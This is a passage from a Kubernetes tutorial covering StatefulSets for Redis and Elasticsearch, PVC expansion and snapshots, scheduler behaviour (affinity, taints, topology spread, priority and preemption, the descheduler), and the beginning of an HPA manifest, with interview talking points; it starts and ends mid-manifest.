        runAsNonRoot: true
        runAsUser: 999
        runAsGroup: 999
        fsGroup: 999
        fsGroupChangePolicy: OnRootMismatch
        seccompProfile:
          type: RuntimeDefault
      affinity:
        podAntiAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            - labelSelector:
                matchLabels:
                  app.kubernetes.io/name: redis
              topologyKey: kubernetes.io/hostname
      topologySpreadConstraints:
        - maxSkew: 1
          topologyKey: topology.kubernetes.io/zone
          whenUnsatisfiable: DoNotSchedule
          labelSelector:
            matchLabels:
              app.kubernetes.io/name: redis
      initContainers:
        - name: render-config
          image: redis:7.2-alpine
          command:
            - sh
            - -c
            - |
              set -e
              cp /config-template/redis.conf /etc/redis/redis.conf
              echo "requirepass ${REDIS_PASSWORD}" >> /etc/redis/redis.conf
              echo "masterauth ${REDIS_PASSWORD}" >> /etc/redis/redis.conf
              ORDINAL=${HOSTNAME##*-}
              if [ "$ORDINAL" != "0" ]; then
                echo "replicaof redis-0.redis-headless 6379" >> /etc/redis/redis.conf
              fi
              echo "rendered config for $HOSTNAME"
          env:
            - name: REDIS_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: redis-credentials
                  key: password
          securityContext:
            allowPrivilegeEscalation: false
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: config-template
              mountPath: /config-template
            - name: config
              mountPath: /etc/redis
          resources:
            requests:
              cpu: 25m
              memory: 32Mi
            limits:
              cpu: 100m
              memory: 64Mi
      containers:
        - name: redis
          image: redis:7.2-alpine
          command: ["redis-server", "/etc/redis/redis.conf"]
          ports:
            - name: redis
              containerPort: 6379
          env:
            - name: REDIS_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: redis-credentials
                  key: password
          resources:
            requests:
              cpu: 100m
              memory: 256Mi
            limits:
              cpu: 500m
              memory: 512Mi
          startupProbe:
            exec:
              command: ["sh", "-c", "redis-cli -a \"$REDIS_PASSWORD\" ping | grep PONG"]
            periodSeconds: 3
            failureThreshold: 20
          livenessProbe:
            exec:
              command: ["sh", "-c", "redis-cli -a \"$REDIS_PASSWORD\" ping | grep PONG"]
            periodSeconds: 15
            timeoutSeconds: 5
            failureThreshold: 3
          readinessProbe:
            exec:
              command: ["sh", "-c", "redis-cli -a \"$REDIS_PASSWORD\" ping | grep PONG"]
            periodSeconds: 10
            timeoutSeconds: 3
            failureThreshold: 3
          lifecycle:
            preStop:
              exec:
                command: ["sh", "-c", "redis-cli -a \"$REDIS_PASSWORD\" SHUTDOWN SAVE || true"]
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: data
              mountPath: /data
            - name: config
              mountPath: /etc/redis
      volumes:
        - name: config-template
          configMap:
            name: redis-config
        - name: config
          emptyDir: {}
  volumeClaimTemplates:
    - metadata:
        name: data
      spec:
        accessModes:
          - ReadWriteOnce
        storageClassName: shopwave-balanced-delete
        resources:
          requests:
            storage: 8Gi
```

`04-config/11-redis.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: redis-config
  namespace: shopwave-prod
data:
  redis.conf: |
    bind 0.0.0.0
    protected-mode yes
    port 6379
    tcp-backlog 511
    timeout 0
    tcp-keepalive 300
    maxmemory 400mb
    maxmemory-policy allkeys-lru
    appendonly yes
    appendfsync everysec
    save 900 1
    save 300 10
    dir /data
    loglevel notice
    logfile ""
```

> **The `render-config` init container is the canonical no-templating pattern.** A ConfigMap is static text; a StatefulSet pod needs **per-ordinal** config (`replicaof` on every pod except `redis-0`). Without Helm or an operator, the init container reads `$HOSTNAME`, derives the ordinal, renders the final config into a shared `emptyDir`, and exits. The main container mounts that emptyDir. **This is exactly how you do per-replica configuration with plain manifests**, and it's a great demonstration that "no automation" doesn't mean "no capability".

> **`maxmemory 400mb` vs `limits.memory: 512Mi` — the gap is deliberate.** Redis's `maxmemory` bounds the **dataset**; the process also uses memory for client buffers, replication backlog, COW during `BGSAVE`, and fragmentation. Set `maxmemory` equal to the container limit and Redis gets **OOMKilled during a background save** — the fork doubles memory transiently. Roughly 20–25% headroom is the rule. Same class of bug as the JVM heap problem in Part 7: **the runtime must be told about the cgroup limit, and told a number smaller than it.**

> **FREE-TIER NOTE — skip `search` on a 12-vCPU cluster.** Elasticsearch requests ~1 GiB RAM and 300m CPU **per replica** (3 replicas = the whole budget). On a single 3-node `e2-standard-2` pool it will not fit alongside everything else and its pods will sit `Pending`. **Do not apply this StatefulSet on the free tier.** It is kept here because the `Parallel` vs `OrderedReady` contrast is a core interview point — read it, understand it, but don't deploy it. If you must see it run, scale it to `replicas: 1` and temporarily scale `notifications`/`inventory` to 0.

## 12.4 `search` StatefulSet — parallel, symmetric (DO NOT DEPLOY on free tier)

`07-stateful/02-search.yaml`:

```yaml
apiVersion: v1
kind: Service
metadata:
  name: search-headless
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: search
spec:
  clusterIP: None
  publishNotReadyAddresses: true
  selector:
    app.kubernetes.io/name: search
  ports:
    - name: http
      port: 9200
      targetPort: http
    - name: transport
      port: 9300
      targetPort: transport
---
apiVersion: v1
kind: Service
metadata:
  name: search
  namespace: shopwave-prod
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: search
  ports:
    - name: http
      port: 9200
      targetPort: http
---
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: search
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: search
    app.kubernetes.io/component: search
    app.kubernetes.io/part-of: shopwave
spec:
  serviceName: search-headless
  replicas: 3
  # Symmetric cluster: all peers are equal, they discover each other.
  # OrderedReady would deadlock - node 0 waits to be Ready, but it cannot
  # form a quorum until nodes 1 and 2 exist, which OrderedReady prevents.
  podManagementPolicy: Parallel
  updateStrategy:
    type: RollingUpdate
  selector:
    matchLabels:
      app.kubernetes.io/name: search
  template:
    metadata:
      labels:
        app.kubernetes.io/name: search
        app.kubernetes.io/component: search
        app.kubernetes.io/part-of: shopwave
    spec:
      automountServiceAccountToken: false
      enableServiceLinks: false
      terminationGracePeriodSeconds: 120
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        runAsGroup: 1000
        fsGroup: 1000
        fsGroupChangePolicy: OnRootMismatch
      topologySpreadConstraints:
        - maxSkew: 1
          topologyKey: topology.kubernetes.io/zone
          whenUnsatisfiable: DoNotSchedule
          labelSelector:
            matchLabels:
              app.kubernetes.io/name: search
      affinity:
        podAntiAffinity:
          requiredDuringSchedulingIgnoredDuringExecution:
            - labelSelector:
                matchLabels:
                  app.kubernetes.io/name: search
              topologyKey: kubernetes.io/hostname
      containers:
        - name: search
          image: docker.elastic.co/elasticsearch/elasticsearch:8.14.1
          ports:
            - name: http
              containerPort: 9200
            - name: transport
              containerPort: 9300
          env:
            - name: node.name
              valueFrom:
                fieldRef:
                  fieldPath: metadata.name
            - name: cluster.name
              value: shopwave-search
            - name: discovery.seed_hosts
              value: "search-0.search-headless,search-1.search-headless,search-2.search-headless"
            - name: cluster.initial_master_nodes
              value: "search-0,search-1,search-2"
            - name: xpack.security.enabled
              value: "false"
            - name: ES_JAVA_OPTS
              value: "-Xms512m -Xmx512m"
            - name: bootstrap.memory_lock
              value: "false"
          resources:
            requests:
              cpu: 300m
              memory: 1Gi
            limits:
              cpu: 1000m
              memory: 1536Mi
          startupProbe:
            httpGet:
              path: /_cluster/health?local=true
              port: http
            periodSeconds: 5
            failureThreshold: 60
          livenessProbe:
            tcpSocket:
              port: transport
            periodSeconds: 20
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /_cluster/health?local=true
              port: http
            periodSeconds: 10
            failureThreshold: 3
          securityContext:
            allowPrivilegeEscalation: false
            capabilities:
              drop:
                - ALL
          volumeMounts:
            - name: data
              mountPath: /usr/share/elasticsearch/data
  volumeClaimTemplates:
    - metadata:
        name: data
      spec:
        accessModes:
          - ReadWriteOnce
        storageClassName: shopwave-balanced-delete
        resources:
          requests:
            storage: 10Gi
```

> **`search` uses `Parallel`, `postgres` uses `OrderedReady`, and that contrast is the whole lesson.** A symmetric quorum cluster **deadlocks** under `OrderedReady`: `search-0` can't become Ready until it forms a cluster, it can't form a cluster until peers exist, and peers aren't created until it's Ready. `Parallel` is not an optimisation here — it's a **correctness requirement**. Conversely, a primary/replica database **must** be `OrderedReady` or the replica tries to attach to a primary that doesn't exist yet.
>
> Note also `-Xms512m -Xmx512m` against `limits.memory: 1536Mi` — the JVM heap is **one third** of the container limit, because Elasticsearch needs the rest for off-heap Lucene segments and the OS page cache. Same lesson as Redis and gunicorn: **the runtime's internal limit must be well below the cgroup limit.**

## 12.5 Volume expansion

```bash
kubectl patch pvc data-postgres-0 -n shopwave-prod \
  -p '{"spec":{"resources":{"requests":{"storage":"40Gi"}}}}'

kubectl get pvc data-postgres-0 -n shopwave-prod -w
kubectl describe pvc data-postgres-0 -n shopwave-prod
```

Two phases, and knowing both is the answer:

1. **`ControllerExpandVolume`** — the CSI controller grows the **GCP disk**. Online, no restart.
2. **`NodeExpandVolume`** — the CSI node plugin grows the **filesystem** (`resize2fs`/`xfs_growfs`). Modern CSI does this online too; older ones needed a pod restart, which is why you sometimes see `FileSystemResizePending`.

> **You cannot shrink.** There is no API for it and there never will be. The only path is: snapshot → new smaller PVC → restore → migrate → delete old. Size generously, and remember `allowVolumeExpansion: true` must have been set **before** you needed it.

> **Expanding a StatefulSet's `volumeClaimTemplates` does NOT expand existing PVCs.** The template is only used at **PVC creation**. Editing it affects **future** ordinals only — and in fact `volumeClaimTemplates` is **immutable** on most versions, so the edit is rejected outright. You must patch each existing PVC individually. Another genuinely good gotcha.

## 12.6 Snapshots — this is your backup

`06-storage/10-volumesnapshotclass.yaml`:

```yaml
apiVersion: snapshot.storage.k8s.io/v1
kind: VolumeSnapshotClass
metadata:
  name: shopwave-snapshot-class
driver: pd.csi.storage.gke.io
deletionPolicy: Retain
parameters:
  storage-locations: asia-south1
```

`06-storage/11-snapshot.yaml`:

```yaml
apiVersion: snapshot.storage.k8s.io/v1
kind: VolumeSnapshot
metadata:
  name: postgres-snapshot-20260718
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: postgres
spec:
  volumeSnapshotClassName: shopwave-snapshot-class
  source:
    persistentVolumeClaimName: data-postgres-0
```

Restore — a **new PVC with a `dataSource`**:

`06-storage/12-restore.yaml`:

```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: data-postgres-restored
  namespace: shopwave-prod
spec:
  storageClassName: shopwave-ssd-retain
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 20Gi
  dataSource:
    name: postgres-snapshot-20260718
    kind: VolumeSnapshot
    apiGroup: snapshot.storage.k8s.io
```

```bash
kubectl apply -f 06-storage/11-snapshot.yaml
kubectl get volumesnapshot -n shopwave-prod -w
kubectl describe volumesnapshot postgres-snapshot-20260718 -n shopwave-prod
```

> **A disk snapshot of a running database is `crash-consistent`, not `application-consistent`.** It is exactly equivalent to yanking the power cord. Postgres **will** recover from it via WAL replay — that's what WAL is for — but you must be able to say the words: for a *guaranteed* application-consistent snapshot you either quiesce the DB (`pg_start_backup()` / `CHECKPOINT`) or you accept crash consistency and rely on the engine's recovery. For anything that isn't a real database with a WAL, crash-consistent means **corrupt**.
>
> And the sentence that matters most: **a snapshot you have never restored is not a backup, it's a hope.** Restore drills go in the calendar. `deletionPolicy: Retain` so deleting the VolumeSnapshot object doesn't delete the actual GCP snapshot — the same `Retain` lesson as PVs, one layer up.

## 12.7 Verify

```bash
kubectl apply -f 06-storage/
kubectl apply -f 07-stateful/

kubectl get statefulset -n shopwave-prod
kubectl get pvc -n shopwave-prod
kubectl get pv
gcloud compute disks list --filter="name~pvc"

# Stable identity, proven
kubectl exec -n shopwave-prod postgres-0 -- hostname
kubectl delete pod postgres-0 -n shopwave-prod
kubectl get pod postgres-0 -n shopwave-prod -w
kubectl exec -n shopwave-prod postgres-0 -- hostname   # same name, same disk

# Ordered scale-down: 2 goes first
kubectl scale statefulset search -n shopwave-prod --replicas=1
kubectl get pods -n shopwave-prod -l app.kubernetes.io/name=search -w
```

> **Deleting a StatefulSet does NOT delete its PVCs.** Deliberate: the data outlives the workload. It also means a `kubectl delete -f` and re-apply **reuses the old disks** — which is usually what you want and occasionally a horrible surprise. Since 1.27, `persistentVolumeClaimRetentionPolicy` lets you opt into deletion:
> ```yaml
> spec:
>   persistentVolumeClaimRetentionPolicy:
>     whenDeleted: Retain
>     whenScaled: Delete
> ```
> `whenScaled: Delete` is the useful one — scaling from 5 to 3 cleans up two orphaned disks that would otherwise bill you forever.

## 12.8 Part 12 interview talking points

- `WaitForFirstConsumer` vs `Immediate`, and the `volume node affinity conflict` Pending pod
- `reclaimPolicy: Delete` is the GKE default — and why databases get `Retain`
- Recovering a `Released` PV: delete the `claimRef`
- StatefulSet's three guarantees; PVC naming `data-postgres-0`; the `serviceName` link to DNS
- `OrderedReady` vs `Parallel` — and that `Parallel` is a **correctness** requirement for a quorum cluster
- `updateStrategy.partition` as an ordinal-based canary; `OnDelete` as the manual escape hatch
- **RWO is one NODE, not one pod** — `ReadWriteOncePod` exists for that
- PD does not do RWX; Filestore or rearchitect
- `fsGroup` recursive chown startup delays; `fsGroupChangePolicy: OnRootMismatch`
- The runtime-limit-below-cgroup-limit rule: Redis `maxmemory`, JVM `-Xmx`, gunicorn workers
- Expansion is two-phase; you cannot shrink; `volumeClaimTemplates` doesn't retro-expand
- Snapshots are crash-consistent; `Retain` deletion policy; **an untested backup is not a backup**
- Deleting a StatefulSet keeps PVCs; `persistentVolumeClaimRetentionPolicy`


---

# Part 13 — Scheduling

## 13.1 How the scheduler actually works

Two phases, per pod, one pod at a time:

```
Pending pod
    ↓
[1] FILTER (predicates) - which nodes CAN run this pod?
    NodeResourcesFit, NodeAffinity, NodeName, NodePorts,
    TaintToleration, VolumeBinding, PodTopologySpread,
    InterPodAffinity, NodeUnschedulable, VolumeZone ...
    ↓
  feasible nodes (if zero -> Pending, event "0/N nodes are available: ...")
    ↓
[2] SCORE (priorities) - which node is BEST?
    NodeResourcesBalancedAllocation, ImageLocality,
    InterPodAffinity, PodTopologySpread, TaintToleration,
    NodeAffinity ...  each 0-100, weighted, summed
    ↓
  highest score wins (ties broken randomly)
    ↓
[3] BIND - write pod.spec.nodeName. kubelet on that node takes over.
```

Three things to know that people miss:

- **The scheduler only reads `requests`, never `limits`, and never actual usage.** A node at 95% real CPU with only 10% *requested* looks empty to the scheduler. This is why under-requested pods cause node hotspots that autoscaling won't fix.
- **Binding is just setting `spec.nodeName`.** The scheduler doesn't start anything. The kubelet on that node is watching for pods with its own name and picks it up. You can bypass the scheduler entirely by setting `nodeName` yourself — which also skips **all** filters, including resource fit.
- **Scheduling is one pod at a time, and there's no backtracking.** Pod A gets the last slot; pod B (which needed to be co-located with A) is now stuck. The scheduler doesn't reconsider A. That's why a Job of 100 pods can half-schedule and wedge, and why **gang scheduling** needs an external scheduler (Kueue, Volcano).

## 13.2 `nodeSelector` and node affinity

```yaml
# Simplest: exact label match, AND-ed
nodeSelector:
  pool: app
  cloud.google.com/gke-spot: "false"
```

Node affinity is the expressive version:

```yaml
affinity:
  nodeAffinity:
    requiredDuringSchedulingIgnoredDuringExecution:
      nodeSelectorTerms:
        - matchExpressions:
            - key: pool
              operator: In
              values:
                - app
                - app-highmem
            - key: topology.kubernetes.io/zone
              operator: NotIn
              values:
                - asia-south1-c
    preferredDuringSchedulingIgnoredDuringExecution:
      - weight: 80
        preference:
          matchExpressions:
            - key: node.kubernetes.io/instance-type
              operator: In
              values:
                - e2-standard-8
      - weight: 20
        preference:
          matchExpressions:
            - key: topology.kubernetes.io/zone
              operator: In
              values:
                - asia-south1-a
```

Operators: `In`, `NotIn`, `Exists`, `DoesNotExist`, `Gt`, `Lt`.

> **The names decode literally, and this is a favourite question:**
> - **`requiredDuringScheduling`** — a hard filter. No matching node → **Pending**.
> - **`preferredDuringScheduling`** — a scoring boost. No matching node → schedules **anyway**.
> - **`IgnoredDuringExecution`** — **the rule is NEVER re-evaluated after the pod is running.** Change a node's labels so the pod no longer matches, and the pod **stays put**, happily violating your rule forever.
>
> The `RequiredDuringExecution` variant has been "planned" for years and **still does not exist**. If you need eviction-on-violation, you need the **descheduler**. Saying "IgnoredDuringExecution means Kubernetes will never fix a drifted placement for you, so I run the descheduler" is a Staff-level answer.

**`nodeSelectorTerms` are OR-ed; `matchExpressions` within a term are AND-ed.** Get this backwards and your rule means the opposite of what you intended. It's a classic.

**Useful built-in node labels:**

```
kubernetes.io/hostname
topology.kubernetes.io/zone
topology.kubernetes.io/region
node.kubernetes.io/instance-type
cloud.google.com/gke-nodepool
cloud.google.com/gke-spot
cloud.google.com/machine-family
kubernetes.io/arch
kubernetes.io/os
```

## 13.3 Taints and tolerations — the inverse

**Affinity is the pod choosing a node. Taints are the node rejecting pods.** You need both: affinity alone can't stop *other* pods landing on your special node.

```bash
kubectl taint nodes <node> dedicated=system:NoSchedule
kubectl taint nodes <node> dedicated=system:NoSchedule-   # remove
```

Three effects:

| Effect | Meaning |
|---|---|
| `NoSchedule` | New pods without a toleration are not scheduled. **Existing pods stay.** |
| `PreferNoSchedule` | Soft. Scheduler avoids it if it can. |
| `NoExecute` | New pods rejected **AND running pods without a toleration are EVICTED**. |

```yaml
tolerations:
  - key: dedicated
    operator: Equal
    value: system
    effect: NoSchedule

  - key: cloud.google.com/gke-spot
    operator: Equal
    value: "true"
    effect: NoSchedule

  # Tolerate EVERYTHING (this is what a DaemonSet does)
  - operator: Exists

  # Tolerate a NoExecute taint for 5 minutes, then get evicted
  - key: node.kubernetes.io/unreachable
    operator: Exists
    effect: NoExecute
    tolerationSeconds: 300
```

> **A toleration does not attract, it only permits.** `tolerations` on a pod does **not** mean "put me on the tainted node" — it means "you *may*". To actually target it you need a **`nodeSelector`/affinity as well**. Half of all "why did my Spot pod land on an on-demand node?" questions are this. **Taints repel; affinity attracts. You almost always need the pair.**

### The built-in taints — and where node failure detection lives

Kubernetes taints nodes automatically:

```
node.kubernetes.io/not-ready:NoExecute
node.kubernetes.io/unreachable:NoExecute
node.kubernetes.io/memory-pressure:NoSchedule
node.kubernetes.io/disk-pressure:NoSchedule
node.kubernetes.io/pid-pressure:NoSchedule
node.kubernetes.io/network-unavailable:NoSchedule
node.kubernetes.io/unschedulable:NoSchedule        # <- kubectl cordon
node.cloudprovider.kubernetes.io/uninitialized:NoSchedule
```

> **This is how node failure actually works, end to end** — and it's a top-tier answer:
>
> 1. The kubelet renews its **Lease** in `kube-node-lease` every **10s** (`nodeLeaseDurationSeconds`).
> 2. The **node-lifecycle-controller** watches those Leases. After `node-monitor-grace-period` (**default 40s**) with no renewal, it marks the node `Ready=Unknown`.
> 3. It applies **`node.kubernetes.io/unreachable:NoExecute`**.
> 4. **Every pod** gets an automatically-injected toleration for that taint with **`tolerationSeconds: 300`** (the API server's `DefaultTolerationSeconds` admission plugin adds it).
> 5. So pods are evicted **5 minutes** after the node goes unreachable.
>
> **Total: ~40s detection + 300s toleration ≈ 5.5 minutes before your pods move.** If that's too slow for you — and for many workloads it is — you lower `tolerationSeconds` on the pod:
> ```yaml
> tolerations:
>   - key: node.kubernetes.io/unreachable
>     operator: Exists
>     effect: NoExecute
>     tolerationSeconds: 30
> ```
> The trade-off is real: a 30-second network blip now evicts your whole node's workload. **This is the single best "how does Kubernetes detect a dead node and why does failover take 5 minutes?" answer**, and it ties the Lease from Part 4 all the way to node failure.

## 13.4 Pod affinity and anti-affinity

```yaml
affinity:
  podAntiAffinity:
    requiredDuringSchedulingIgnoredDuringExecution:
      - labelSelector:
          matchLabels:
            app.kubernetes.io/name: payments
        topologyKey: kubernetes.io/hostname

  podAffinity:
    preferredDuringSchedulingIgnoredDuringExecution:
      - weight: 100
        podAffinityTerm:
          labelSelector:
            matchLabels:
              app.kubernetes.io/name: redis
          topologyKey: topology.kubernetes.io/zone
```

**`topologyKey` is the whole thing.** It's a **node label**, and it defines the *domain* the rule applies to:

| topologyKey | Anti-affinity means |
|---|---|
| `kubernetes.io/hostname` | Never two on the same **node** |
| `topology.kubernetes.io/zone` | Never two in the same **zone** |
| `topology.kubernetes.io/region` | Never two in the same **region** |

> **Pod affinity is expensive — genuinely, at scale.** For each candidate node, the scheduler must evaluate the labels of **every pod on every node in the topology domain**. It's roughly O(pods × nodes), where node anti-affinity is O(nodes). The docs explicitly warn against it above ~several hundred nodes. **`topologySpreadConstraints` is the cheaper, more expressive successor** and it's what you should reach for. Volunteering "I use topology spread instead of pod anti-affinity because anti-affinity doesn't scale" is a strong signal.

> **`requiredDuringScheduling` anti-affinity on hostname caps your replicas at your node count.** `replicas: 5` with 3 nodes = **2 pods Pending forever**, and the HPA will keep trying and failing. That's correct behaviour, and it surprises people during an incident when they scale up and nothing happens.

## 13.5 topologySpreadConstraints — the modern way

```yaml
topologySpreadConstraints:
  - maxSkew: 1
    topologyKey: topology.kubernetes.io/zone
    whenUnsatisfiable: DoNotSchedule
    labelSelector:
      matchLabels:
        app.kubernetes.io/name: payments
    minDomains: 3
    nodeAffinityPolicy: Honor
    nodeTaintsPolicy: Honor
  - maxSkew: 1
    topologyKey: kubernetes.io/hostname
    whenUnsatisfiable: ScheduleAnyway
    labelSelector:
      matchLabels:
        app.kubernetes.io/name: payments
```

**`maxSkew`** = the maximum allowed difference between the most-populated and least-populated domain.

With `maxSkew: 1` across 3 zones and 4 replicas: `2/1/1` is legal (skew 1); `2/2/0` is **not** (skew 2).

**`whenUnsatisfiable`:**
- `DoNotSchedule` — hard. Pod stays **Pending** rather than violate the spread.
- `ScheduleAnyway` — soft. Becomes a scoring preference.

> **The choice encodes your priority: availability vs balance.**
> - `payments`, `orders`, `redis`, `search` → **`DoNotSchedule`**. I would rather have 2 replicas correctly spread than 3 replicas where 2 are in one zone and a zone failure takes both.
> - `frontend`, `catalog` → **`ScheduleAnyway`**. A slightly imbalanced storefront beats an unschedulable one.
>
> Being able to explain *why the same field differs between two of your own services* is worth more than reciting the field's definition.

**`minDomains: 3`** — a subtle and excellent one: without it, if only **one** zone has nodes right now, `1/-/-` has a skew of 0 (there's only one domain!) and the constraint is trivially satisfied — **all your pods land in one zone and Kubernetes says everything is fine**. `minDomains: 3` forces the scheduler to *count* three domains, so the skew maths is honest and it will hold pods Pending until the Cluster Autoscaler brings up nodes elsewhere.

**`nodeAffinityPolicy` / `nodeTaintsPolicy` (`Honor` | `Ignore`, 1.27+)** — should nodes your pod *can't use anyway* count as domains? `Honor` (only count nodes that pass your affinity/taints) is almost always what you mean, and `Ignore` is the legacy default in older versions — which produced skew calculations over nodes the pod could never be placed on. Another silent-wrong-answer bug.

**Cluster-wide defaults** live in the scheduler config:

```yaml
apiVersion: kubescheduler.config.k8s.io/v1
kind: KubeSchedulerConfiguration
profiles:
  - pluginConfig:
      - name: PodTopologySpread
        args:
          defaultingType: List
          defaultConstraints:
            - maxSkew: 3
              topologyKey: topology.kubernetes.io/zone
              whenUnsatisfiable: ScheduleAnyway
```

(On GKE you can't edit the scheduler config on a Standard cluster's managed control plane — so you set constraints per-workload, which is what we do. **Knowing you can't is itself the answer** to "how would you set a cluster-wide default on GKE?")

## 13.6 PriorityClass and preemption

`11-scheduling/00-priorityclasses.yaml`:

```yaml
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: shopwave-critical
value: 1000000
globalDefault: false
preemptionPolicy: PreemptLowerPriority
description: "Payments, orders, postgres. Preempts lower priority pods."
---
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: shopwave-high
value: 100000
globalDefault: false
preemptionPolicy: PreemptLowerPriority
description: "Frontend, catalog, cart, inventory."
---
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: shopwave-default
value: 1000
globalDefault: true
preemptionPolicy: PreemptLowerPriority
description: "Default for anything unspecified."
---
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: shopwave-low
value: 100
globalDefault: false
preemptionPolicy: Never
description: "Batch, notifications. Never preempts; is preempted first."
```

### How preemption works

A high-priority pod is Pending because no node fits. The scheduler:

1. Finds nodes where **evicting some lower-priority pods** would make it fit.
2. Picks the node with the **fewest, lowest-priority** victims (and it tries to avoid violating PDBs — but **it will violate a PDB if it must**).
3. **Gracefully deletes** the victims (respecting `terminationGracePeriodSeconds`).
4. The high-priority pod is scheduled.

> **Preemption is not instant and there's no reservation.** Between steps 3 and 4, the scheduler has **no lock on the freed space**. A *third* pod can grab it. The preemptor then has to preempt again somewhere else. Your low-priority pods were killed for nothing. This is a real, documented behaviour.

> **`preemptionPolicy: Never` on `shopwave-low` is deliberate.** A batch pod that *is* preemptible but *never* preempts. Without this, a big batch job at priority 100 could still evict priority-50 pods, which is not what "low priority" is supposed to mean.

> **`globalDefault: true` applies only to pods created *after* it exists.** Existing pods get priority 0 and are not retroactively updated. So the pods you deployed yesterday are all lower priority than everything you deploy today — which you discover during the first resource crunch. Set `globalDefault` before you have workloads, or accept a fleet-wide restart.

> **Tie back to Part 3:** the **scoped ResourceQuota** on `shopwave-critical` is what stops a team labelling everything critical and defeating the whole scheme. Priority without quota is just a race to the top.

## 13.7 Descheduler — the missing piece

Kubernetes **never re-evaluates a running pod's placement**. So over time you get drift: a node comes back from maintenance and is empty forever; anti-affinity is violated because it was scheduled before a peer; a node is at 95% while another is at 20%.

The **descheduler** is a separate component (a CronJob, from `sigs.k8s.io/descheduler`) that evicts pods so the scheduler can place them better:

```yaml
apiVersion: descheduler/v1alpha2
kind: DeschedulerPolicy
profiles:
  - name: shopwave-rebalance
    pluginConfig:
      - name: RemoveDuplicates
      - name: RemovePodsViolatingTopologySpreadConstraint
        args:
          constraints:
            - DoNotSchedule
      - name: LowNodeUtilization
        args:
          thresholds:
            cpu: 20
            memory: 20
            pods: 20
          targetThresholds:
            cpu: 70
            memory: 70
            pods: 70
      - name: RemovePodsViolatingInterPodAntiAffinity
      - name: RemovePodsViolatingNodeTaints
```

> **The descheduler only evicts. It never schedules.** It deletes a pod and trusts the scheduler to do better next time — and **it might not**, which is why the descheduler is careful about PDBs, priority, and its own eviction limits. Knowing that Kubernetes has **no rebalancing** built in, and that the descheduler is the (external, optional, imperfect) answer, is exactly the kind of thing that separates people who've operated a cluster for two years from people who've read the docs.

## 13.8 Verify

```bash
kubectl apply -f 11-scheduling/
kubectl get priorityclass

kubectl get pods -n shopwave-prod -o wide \
  --sort-by=.spec.nodeName

# Prove the spread
kubectl get pods -n shopwave-prod -l app.kubernetes.io/name=payments \
  -o custom-columns='POD:.metadata.name,NODE:.spec.nodeName,ZONE:.metadata.labels.topology\.kubernetes\.io/zone'

# Why is it Pending? THE command.
kubectl describe pod <pending-pod> -n shopwave-prod | grep -A20 Events
```

The scheduler's Pending message is remarkably good and you should be able to read it aloud:

```
0/6 nodes are available:
  2 node(s) had untolerated taint {dedicated: system},
  1 node(s) had untolerated taint {cloud.google.com/gke-spot: true},
  2 Insufficient cpu,
  1 node(s) didn't match pod topology spread constraints.
preemption: 0/6 nodes are available:
  6 No preemption victims found for incoming pod.
```

> **Read it as a filter tally**: each clause is one predicate that rejected N nodes, and the counts sum to the total. `No preemption victims found` means preemption was attempted and there was nothing lower-priority worth killing. Being able to decode this line by line in an interview is worth a lot — it's the single most common real-world Kubernetes debugging artifact.

## 13.9 Part 13 interview talking points

- Filter → Score → Bind; **binding is just setting `spec.nodeName`**
- The scheduler reads **requests only** — never limits, never actual usage
- One pod at a time, **no backtracking**; gang scheduling needs Kueue/Volcano
- `required` vs `preferred`; **`IgnoredDuringExecution` is never re-evaluated**; `RequiredDuringExecution` doesn't exist
- `nodeSelectorTerms` OR-ed, `matchExpressions` AND-ed
- **Taints repel, affinity attracts — a toleration does not attract**
- The three taint effects; `NoExecute` evicts running pods
- **The full node-failure path: Lease (10s) → 40s grace → `unreachable:NoExecute` → default 300s toleration → eviction ≈ 5.5 min**, and how to tune it
- Pod anti-affinity is O(pods × nodes) and doesn't scale; topology spread is the successor
- `required` anti-affinity on hostname caps replicas at node count
- `maxSkew`, `DoNotSchedule` vs `ScheduleAnyway`, and **why the same field differs per service**
- `minDomains` — without it, one zone trivially satisfies the constraint
- `nodeAffinityPolicy: Honor`
- Preemption: fewest/lowest victims, graceful, **no reservation**, may violate PDBs
- `preemptionPolicy: Never`; `globalDefault` isn't retroactive; priority needs scoped quota
- Kubernetes has **no rebalancing** — the descheduler is the external answer
- Reading a Pending pod's scheduler message


---

# Part 14 — Autoscaling

Four autoscalers, three axes, and they interact badly if you don't understand them.

| Autoscaler | Axis | Changes |
|---|---|---|
| **HPA** | Horizontal, pods | `replicas` |
| **VPA** | Vertical, pods | `requests`/`limits` |
| **Cluster Autoscaler** | Horizontal, nodes | node count |
| **Node Auto-Provisioning** | Node **shape** | creates whole node pools |

## 14.1 HPA

`12-autoscaling/00-hpa-frontend.yaml`:

```yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: frontend
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: frontend
    app.kubernetes.io/part-of: shopwave
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: frontend
  minReplicas: 2
  maxReplicas: 4
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 60
    - type: Resource
      resource:
        name: memory
        target:
          type: Utilization
          averageUtilization: 75
  behavior:
    scaleUp:
      stabilizationWindowSeconds: 30
      policies:
        - type: Percent
          value: 100
          periodSeconds: 30
        - type: Pods
          value: 4
          periodSeconds: 30
      selectPolicy: Max
    scaleDown:
      stabilizationWindowSeconds: 300
      policies:
        - type: Percent
          value: 25
          periodSeconds: 60
        - type: Pods
          value: 2
